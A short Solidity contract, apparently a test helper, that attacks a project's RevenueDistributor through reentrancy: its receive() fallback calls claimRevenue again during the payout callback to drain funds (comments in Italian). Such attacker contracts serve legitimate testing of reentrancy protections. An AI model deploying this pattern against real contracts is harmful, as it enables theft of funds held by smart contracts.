// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../RevenueDistributor.sol";

contract ReentrancyAttacker {
    RevenueDistributor public revenueDistributor;
    uint256 public distributionId;

    constructor(address payable _revenueDistributor) {
        revenueDistributor = RevenueDistributor(_revenueDistributor);
    }

    function attack(uint256 _distributionId) external payable {
        distributionId = _distributionId;
        revenueDistributor.receiveRevenue{value: msg.value}(0); // Invia revenue al progetto 0
        revenueDistributor.claimRevenue(distributionId); // Tenta di reclamare i ricavi
    }

    receive() external payable {
        if (address(revenueDistributor).balance >= 0.1 ether) {
            revenueDistributor.claimRevenue(distributionId); // Tenta di reclamare nuovamente durante il callback
        }
    }
} 